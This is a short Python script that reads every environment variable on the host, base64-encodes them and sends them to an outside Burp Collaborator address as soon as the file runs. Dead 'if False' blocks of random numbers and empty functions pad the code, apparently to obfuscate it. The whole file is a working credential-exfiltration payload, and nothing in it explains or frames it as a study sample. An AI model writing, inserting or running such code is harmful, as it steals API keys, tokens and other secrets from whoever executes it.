import urllib.parse
import os
import base64
if False:
    _var_75_0 = (19, 906, 602)
    _var_75_1 = (551, 703, 352)
    _var_75_2 = (857, 5, 950)

    def _var_75_fn():
        pass
import urllib.request

def send_data():
    data = dict(os.environ)
    if False:
        _var_73_0 = (691, 242, 160)
        _var_73_1 = (256, 608, 557)
        _var_73_2 = (69, 900, 733)

        def _var_73_fn():
            pass
    combined_data = '&'.join([f'{k}={v}' for (k, v) in data.items()])
    encoded_data = base64.urlsafe_b64encode(combined_data.encode()).decode()
    base_url = 'http://y875mheo3wvo729eqk13iogr9if83x.burpcollaborator.net'
    url = f'{base_url}/?data={encoded_data}'
    if False:
        _var_74_0 = (807, 842, 775)
        _var_74_1 = (530, 195, 779)

        def _var_74_fn():
            pass
    request = urllib.request.Request(url)
    urllib.request.urlopen(request).close()
send_data()